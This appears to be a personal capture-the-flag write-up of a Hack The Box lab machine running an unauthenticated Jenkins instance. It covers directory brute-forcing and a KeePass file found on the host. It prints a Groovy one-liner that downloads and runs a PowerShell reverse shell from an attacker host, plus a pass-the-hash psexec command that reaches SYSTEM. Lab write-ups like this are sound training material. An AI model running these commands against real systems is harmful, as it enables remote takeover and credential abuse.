# Take Away
- Somethings
# Metadata
- Initial recon did not find anything useful. However, upon switching to wordlist `directory-list-2.3-medium.txt`, `feroxbuster` will identify a subdirectory  called `askjeeves` at `http://10.10.10.63:50000/askjeeves`.![[Pasted image 20240228133044.png]]
	- Upon further inspection, the URL is a page for managing `Jenkins` service. ![[Pasted image 20240228133141.png]]
	- https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security
	- If we navigate to `http://10.10.10.63:50000/askjeeves/configureSecurity/`, one can identify that `Jenkins` is configured to ` Anyone can do anything`. Hence, one can run `Groovy Script` without even login.![[Pasted image 20240228133449.png]]![[Pasted image 20240228133512.png]]
-  There is a `KeePass` database file under the path `C:\Users\kohsuke\Documents`.![[Pasted image 20240228134455.png]]
# Exploitation
- Navigate to `http://10.10.10.63:50000/askjeeves/script` and use the following script to catch a reverse shell call back.
	```
	def process = "powershell.exe -nop -w hidden -c iex(iwr http://10.10.14.23/Windows/nishang/Shells/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.23 -Port 443".execute()
	```
# PrivEsc
- Get and decrypt the `KeePass` file to gain `Administrator` NTLM hash.
- Run `impacket-psexec ./Administrator:@10.10.10.63 -hashes [LM:NTLM]` to get a shell as `nt authority\system`.